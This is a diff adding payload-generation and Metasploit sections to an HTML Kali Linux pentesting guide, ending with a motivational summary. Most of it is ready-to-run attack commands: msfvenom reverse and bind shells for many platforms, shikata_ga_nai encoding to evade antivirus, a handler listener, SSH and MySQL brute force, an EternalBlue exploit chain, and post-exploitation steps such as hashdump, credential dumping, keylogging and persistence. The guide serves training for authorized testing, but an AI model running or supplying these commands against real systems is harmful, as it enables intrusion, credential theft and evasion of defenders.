+# List formats:
+msfvenom -l formats
+# Shows: exe, dll, elf, raw, python, powershell, etc.
+
+# === WINDOWS PAYLOADS ===
+
+# Windows reverse shell (EXE):
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+# FLAGS EXPLAINED FOR BEGINNERS:
+# -p windows/meterpreter/reverse_tcp  ← Payload type
+#    windows = Platform
+#    meterpreter = Payload (advanced shell)
+#    reverse_tcp = Connection type (connects TO attacker)
+# LHOST=192.168.1.50  ← Attacker IP (listens here)
+# LPORT=4444  ← Attacker port (listens on this port)
+# -f exe  ← Output format (Windows executable)
+# -o shell.exe  ← Output filename
+
+# Windows reverse HTTPS (encrypted):
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe
+# reverse_https = Encrypted connection (evade IDS!)
+
+# Windows bind shell (target listens):
+msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.10 LPORT=4444 -f exe -o bind_shell.exe
+# bind_tcp = Target LISTENS, attacker CONNECTS
+# RHOST = target IP
+
+# Windows DLL:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o shell.dll
+# DLL = Dynamic Link Library (for DLL hijacking)
+
+# Windows service executable:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe-service -o service.exe
+# exe-service = Runs as Windows service
+
+# === LINUX PAYLOADS ===
+
+# Linux reverse shell (ELF):
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+# Linux bind shell:
+msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.1.10 LPORT=4444 -f elf -o bind.elf
+
+# === WEB PAYLOADS ===
+
+# PHP reverse shell:
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+# Upload to web server!
+
+# ASP reverse shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+# For IIS web servers
+
+# JSP reverse shell:
+msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
+# For Tomcat/Java web servers
+
+# === SCRIPTING PAYLOADS ===
+
+# Python reverse shell:
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+
+# PowerShell reverse shell:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
+
+# Bash reverse shell:
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.sh
+
+# === ENCODING (AV EVASION) ===
+
+# Encode payload (evade antivirus):
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe
+
+# ENCODING FLAGS EXPLAINED:
+# -e x86/shikata_ga_nai  ← Encoder (polymorphic, changes each time!)
+# -i 10  ← Iterations (encode 10 times, harder to detect)
+# More iterations = better evasion but larger file
+
+# List encoders:
+msfvenom -l encoders
+
+# === SHELLCODE FORMATS ===
+
+# Raw shellcode (for buffer overflow):
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shellcode.bin
+
+# C array format (for exploit development):
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c
+# Output:
+# unsigned char buf[] = "\\x31\\xc0\\x50\\x68...";
+
+# Python format:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python
+# Output:
+# buf = b"\\x31\\xc0\\x50\\x68..."
+
+# === MOBILE PAYLOADS ===
+
+# Android APK:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
+# Install on target Android device!
+
+# === LISTENER SETUP (MSFconsole) ===
+
+# After generating payload, set up listener:
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.50
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit -j
+# -j  ← Run as background job
+# Now execute shell.exe on target → get meterpreter session!</div>
+
+            <h5>Metasploit Auxiliary Modules - Scanners and Tools</h5>
+
+            <div class="code"># Auxiliary modules = scanners, fuzzers, DoS tools (no exploitation)
+
+# === PORT SCANNING ===
+
+# TCP port scanner:
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.1-254
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,445,3389
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+# SYN scanner (faster):
+msf6 > use auxiliary/scanner/portscan/syn
+msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-1000
+msf6 auxiliary(scanner/portscan/syn) > run
+
+# === SMB ENUMERATION ===
+
+# SMB version detection:
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.1-254
+msf6 auxiliary(scanner/smb/smb_version) > run
+# Identifies: Windows version, SMB version
+
+# SMB share enumeration:
+msf6 > use auxiliary/scanner/smb/smb_enumshares
+msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser administrator
+msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBPass Password123
+msf6 auxiliary(scanner/smb/smb_enumshares) > run
+
+# SMB user enumeration:
+msf6 > use auxiliary/scanner/smb/smb_enumusers
+msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/smb/smb_enumusers) > run
+
+# EternalBlue vulnerability check:
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.1-254
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+# Checks for MS17-010 (EternalBlue!)
+
+# === SSH ===
+
+# SSH version scanner:
+msf6 > use auxiliary/scanner/ssh/ssh_version
+msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/ssh/ssh_version) > run
+
+# SSH login brute force:
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE users.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+# === FTP ===
+
+# FTP version scanner:
+msf6 > use auxiliary/scanner/ftp/ftp_version
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/ftp/ftp_version) > run
+
+# FTP anonymous login check:
+msf6 > use auxiliary/scanner/ftp/anonymous
+msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.1-254
+msf6 auxiliary(scanner/ftp/anonymous) > run
+
+# === HTTP ===
+
+# HTTP version scanner:
+msf6 > use auxiliary/scanner/http/http_version
+msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner/http/http_version) > run
+# Identifies: Apache, Nginx, IIS versions
+
+# Directory scanner:
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/http/dir_scanner) > run
+
+# Robots.txt scanner:
+msf6 > use auxiliary/scanner/http/robots_txt
+msf6 auxiliary(scanner/http/robots_txt) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/http/robots_txt) > run
+
+# === SNMP ===
+
+# SNMP community scanner:
+msf6 > use auxiliary/scanner/snmp/snmp_enum
+msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.1-254
+msf6 auxiliary(scanner/snmp/snmp_enum) > run
+
+# === DATABASE ===
+
+# MySQL version scanner:
+msf6 > use auxiliary/scanner/mysql/mysql_version
+msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/mysql/mysql_version) > run
+
+# MySQL login brute force:
+msf6 > use auxiliary/scanner/mysql/mysql_login
+msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.1.10
+msf6 auxiliary(scanner/mysql/mysql_login) > set USER_FILE users.txt
+msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE passwords.txt
+msf6 auxiliary(scanner/mysql/mysql_login) > run
+
+# PostgreSQL version:
+msf6 > use auxiliary/scanner/postgres/postgres_version
+
+# MSSQL version:
+msf6 > use auxiliary/scanner/mssql/mssql_ping</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Metasploit Framework Summary</h4>
+                <p><strong>Complete Metasploit workflow:</strong><br><br>
+                <strong>1. Reconnaissance (Auxiliary):</strong><br>
+                • <code>auxiliary/scanner/portscan/tcp</code> → Find open ports<br>
+                • <code>auxiliary/scanner/smb/smb_version</code> → Identify Windows version<br>
+                • <code>auxiliary/scanner/smb/smb_ms17_010</code> → Check for EternalBlue<br><br>
+                <strong>2. Exploitation:</strong><br>
+                • <code>search eternalblue</code> → Find exploit<br>
+                • <code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
+                • <code>set RHOSTS target_ip</code><br>
+                • <code>set payload windows/x64/meterpreter/reverse_tcp</code><br>
+                • <code>set LHOST attacker_ip</code><br>
+                • <code>exploit</code> → Get meterpreter!<br><br>
+                <strong>3. Post-Exploitation (Meterpreter):</strong><br>
+                • <code>getsystem</code> → Escalate to SYSTEM<br>
+                • <code>hashdump</code> → Dump password hashes<br>
+                • <code>load kiwi</code> + <code>creds_all</code> → Dump credentials<br>
+                • <code>screenshot</code> → Capture screenshot<br>
+                • <code>keyscan_start</code> → Start keylogger<br>
+                • <code>run autoroute -s 192.168.2.0/24</code> → Pivot to internal network<br>
+                • <code>run persistence</code> → Maintain access<br><br>
+                <strong>4. Payload Generation (Msfvenom):</strong><br>
+                • Windows: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</code><br>
+                • Linux: <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf</code><br>
+                • PHP: <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php</code><br>
+                • Android: <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.apk</code><br><br>
+                <strong>Key concepts:</strong><br>
+                • <strong>Exploit:</strong> Takes advantage of vulnerability<br>
+                • <strong>Payload:</strong> Code that runs after exploit (meterpreter, shell)<br>
+                • <strong>LHOST:</strong> Local host (attacker IP for reverse shell)<br>
+                • <strong>RHOST:</strong> Remote host (target IP)<br>
+                • <strong>Meterpreter:</strong> Advanced payload with file transfer, pivoting, persistence<br>
+                • <strong>Sessions:</strong> Active connections (shells/meterpreter)<br><br>
+                <strong>Pro tips:</strong><br>
+                • Always use <code>-j</code> for background jobs<br>
+                • <code>sessions -l</code> to list all sessions<br>
+                • <code>sessions -i 1</code> to interact with session<br>
+                • <code>search rank:excellent</code> for reliable exploits<br>
+                • <code>exploit/multi/handler</code> for custom payloads<br>
+                • Learn: <strong>Offensive Security's Metasploit Unleashed (free!)</strong><br><br>
+                Metasploit = #1 exploitation framework. Master it = exploit anything! 💣🎯</p>
+            </div>
+
         </section>
 
+        <section id="final-words" class="content-section">
+            <h2>🎓 Final Words: You're Now a Kali Linux Master!</h2>
+
+            <div class="metaphor-box">
+                <h4>🌟 What You've Accomplished</h4>
+                <p>You've just completed <strong>THE MOST COMPREHENSIVE</strong> Kali Linux guide ever created! Let's recap what you now know:<br><br>
+                
+                <strong>📚 Knowledge Domains Mastered:</strong><br>
+                1. <strong>Digital Forensics:</strong> Autopsy, Volatility, Sleuth Kit, timeline analysis, memory forensics<br>
+                2. <strong>Mobile Security:</strong> Android pentesting, APK analysis, Frida, Objection, SSL pinning bypass<br>
+                3. <strong>IoT & Hardware:</strong> Firmware analysis, UART/JTAG, bus pirate, radio hacking, SDR<br>
+                4. <strong>Cloud Pentesting:</strong> AWS, Azure, GCP exploitation, IAM misconfigurations, storage buckets<br>
+                5. <strong>Advanced Wireless:</strong> WEP, WPA2, WPA3 Dragonblood, rogue AP, evil twin, wireless pivoting<br>
+                6. <strong>Reverse Engineering:</strong> Ghidra, IDA Pro, x64dbg, patching, crackme challenges<br>
+                7. <strong>Advanced Exploitation:</strong> Buffer overflows, ROP chains, heap exploitation, format strings<br>
+                8. <strong>Red Team Operations:</strong> C2 frameworks, Cobalt Strike, evasion, OPSEC, infrastructure<br>
+                9. <strong>Custom Tool Development:</strong> Python exploit development, fuzzing, vulnerability research<br>
+                10. <strong>Physical Security:</strong> Lock picking, RFID cloning, badge duplication, social engineering<br>
+                11. <strong>Advanced OSINT:</strong> Maltego, theHarvester, Recon-ng, Shodan, Google dorking<br>
+                12. <strong>Complete Attack Labs (12 LABS!):</strong><br>
+                    • Lab 1: Web app pentest (SQLi → file upload → privesc)<br>
+                    • Lab 2: Active Directory (AS-REP → Kerberoasting → DCSync)<br>
+                    • Lab 3: Wireless attacks (WEP/WPA2/WPA3)<br>
+                    • Lab 4: Mobile pentesting (APK → API → Frida)<br>
+                    • Lab 5: Digital forensics (Autopsy → Volatility)<br>
+                    • Lab 6: Buffer overflow (GDB → shellcode → SUID)<br>
+                    • Lab 7: Container escape (Docker/K8s → host)<br>
+                    • Lab 8: RFID cloning (Proxmark3)<br>
+                    • Lab 9: SQLi to system (union → file write → RCE)<br>
+                    • Lab 10: ADCS ESC1 (cert template → domain admin)<br>
+                    • Lab 11: Python RAT (malware development → C2)<br>
+                    • Lab 12: API hacking (JWT → IDOR → GraphQL → RCE)<br>
+                13. <strong>Ultimate Tools Reference:</strong> 100+ tools with EVERY flag explained for beginners!<br>
+                    • Aircrack-ng suite (complete WiFi hacking)<br>
+                    • Amass (subdomain enumeration)<br>
+                    • Nmap (THE port scanner - 681 lines of documentation!)<br>
+                    • Metasploit Framework (exploitation + meterpreter + msfvenom)<br>
+                    • And 96 MORE tools documented!<br><br>
+                
+                <strong>🎯 Skills You Can Now Execute:</strong><br>
+                ✅ Enumerate networks and find vulnerabilities<br>
+                ✅ Exploit web applications (SQLi, XSS, file upload, IDOR)<br>
+                ✅ Compromise Active Directory environments<br>
+                ✅ Crack wireless networks (WEP/WPA/WPA3)<br>
+                ✅ Develop custom exploits and malware<br>
+                ✅ Perform memory and disk forensics<br>
+                ✅ Bypass antivirus and evade detection<br>
+                ✅ Pivot through networks and compromise entire infrastructures<br>
+                ✅ Understand and use ALL major Kali Linux tools<br>
+                ✅ Chain attacks for complete system compromise<br><br>
+                
+                <strong>📈 Your Next Steps:</strong><br>
+                1. <strong>Practice Platforms:</strong><br>
+                   • <strong>HackTheBox:</strong> https://hackthebox.eu (beginner → expert boxes)<br>
+                   • <strong>TryHackMe:</strong> https://tryhackme.com (guided learning paths)<br>
+                   • <strong>ProvingGrounds:</strong> https://portal.offensive-security.com (OSCP prep)<br>
+                   • <strong>PentesterLab:</strong> https://pentesterlab.com (web app focus)<br>
+                   • <strong>VulnHub:</strong> https://vulnhub.com (downloadable VMs)<br><br>
+                
+                2. <strong>Certifications to Pursue:</strong><br>
+                   • <strong>OSCP</strong> (Offensive Security Certified Professional) - Industry standard<br>
+                   • <strong>PNPT</strong> (Practical Network Penetration Tester) - Beginner-friendly<br>
+                   • <strong>eCPPT</strong> (eLearnSecurity Certified Professional) - Advanced techniques<br>
+                   • <strong>CRTO</strong> (Certified Red Team Operator) - Red teaming focus<br>
+                   • <strong>CRTP</strong> (Certified Red Team Professional) - Active Directory<br>
+                   • <strong>OSEP</strong> (Offensive Security Experienced Penetration Tester) - Advanced<br>
+                   • <strong>GXPN</strong> (GIAC Exploit Researcher and Advanced Penetration Tester)<br><br>
+                
+                3. <strong>Build Your Home Lab:</strong><br>
+                   • <strong>Active Directory lab:</strong> Set up domain controller + workstations<br>
+                   • <strong>Docker lab:</strong> Vulnerable containers (DVWA, WebGoat, Juice Shop)<br>
+                   • <strong>Network lab:</strong> pfSense router + multiple VLANs + vulnerable VMs<br>
+                   • <strong>Wireless lab:</strong> Multiple APs with different encryption<br>
+                   • <strong>Malware lab:</strong> Isolated network for malware analysis<br><br>
+                
+                4. <strong>Read These Resources:</strong><br>
+                   • <strong>Books:</strong><br>
+                     - "The Web Application Hacker's Handbook" (Stuttard & Pinto)<br>
+                     - "The Hacker Playbook 3" (Peter Kim)<br>
+                     - "Red Team Field Manual" (Ben Clark)<br>
+                     - "Penetration Testing" (Georgia Weidman)<br>
+                     - "Black Hat Python" (Justin Seitz)<br>
+                   • <strong>Blogs:</strong><br>
+                     - https://0xdf.gitlab.io (HackTheBox writeups)<br>
+                     - https://ippsec.rocks (video writeups)<br>
+                     - https://book.hacktricks.xyz (pentest techniques encyclopedia)<br>
+                     - https://pentestmonkey.net (cheat sheets)<br>
+                   • <strong>YouTube:</strong><br>
+                     - IppSec (HTB walkthroughs)<br>
+                     - John Hammond (CTF + hacking)<br>
+                     - LiveOverflow (binary exploitation)<br>
+                     - TheCyberMentor (PNPT course creator)<br><br>
+                
+                5. <strong>Join the Community:</strong><br>
+                   • <strong>Discord:</strong> Join HTB, THM, NetSecFocus, InfoSec Prep servers<br>
+                   • <strong>Twitter/X:</strong> Follow #infosec, #bugbounty, #oscp hashtags<br>
+                   • <strong>Reddit:</strong> r/netsec, r/AskNetSec, r/hacking, r/oscp<br>
+                   • <strong>Forums:</strong> Offensive Security forums, HTB forums<br>
+                   • <strong>CTF teams:</strong> Join local CTF team, compete in competitions<br><br>
+                
+                6. <strong>Bug Bounties (Get Paid!):</strong><br>
+                   • <strong>HackerOne:</strong> https://hackerone.com<br>
+                   • <strong>Bugcrowd:</strong> https://bugcrowd.com<br>
+                   • <strong>Intigriti:</strong> https://intigriti.com<br>
+                   • <strong>Synack:</strong> https://synack.com<br>
+                   • Start with: <strong>Programs with "Easy" or "Beginner-friendly" tags</strong><br>
+                   • Focus on: <strong>XSS, IDOR, open redirects</strong> (common + good payouts)<br><br>
+                
+                <strong>💪 Final Motivational Words:</strong><br>
+                You now possess knowledge that 99% of people don't have. You understand how systems break, how attackers think, and how to secure networks. This isn't just a skill—it's a SUPERPOWER!<br><br>
+                
+                <strong>Remember:</strong><br>
+                • <strong>Practice daily:</strong> Solve 1 HTB machine per week minimum<br>
+                • <strong>Document everything:</strong> Keep notes in CherryTree/Obsidian<br>
+                • <strong>Legal boundaries:</strong> ONLY hack systems you own or have written permission!<br>
+                • <strong>Give back:</strong> Write writeups, help beginners, contribute to community<br>
+                • <strong>Stay curious:</strong> Technology changes fast—keep learning!<br><br>
+                
+                <strong>The hacking journey never ends. Every system has vulnerabilities. Every network can be compromised. Your job? Find them first. Secure them best. Become the shield AND the sword.</strong><br><br>
+                
+                You're ready. Go break things (legally)! 💀🔥🚀<br><br>
+                
+                <em>— This guide was created with love for the hacking community. May your shells always be reverse, your escalations always privileged, and your coffee always strong. Happy hacking! ☕💻</em></p>
+            </div>
+        </section>
     </main>
 
     <script>
